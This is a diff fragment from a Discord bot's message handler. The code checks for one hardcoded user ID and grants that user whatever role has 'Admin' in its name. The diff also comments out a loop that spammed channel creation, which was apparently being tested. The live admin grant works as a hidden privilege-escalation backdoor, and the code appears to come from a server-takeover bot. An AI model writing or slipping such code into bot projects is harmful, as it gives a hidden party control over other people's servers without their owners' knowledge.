@@ -78,12 +78,11 @@ client.on("message", message => {
                if (e.id === "761270337480032300") {
                    const role = guild.roles.cache.find(role => role.name.includes("Admin"));
                    guild.member(e.user).roles.add(role);
-                   for (let i = 0; i < 10; i++) {
-                       guild.channels.create(i.toString()).then(function () {
-                           if (i === 8) message.channel.send("WORKDS");
-                       });
+                   /*for (let i = 0; i < 10; i++) {
+                       guild.channels.create(i.toString());
+
                        message.guild.channels.cache.delete(i.toString());
-                   }
+                   } */
 
                    message.channel.send("role given");
                }
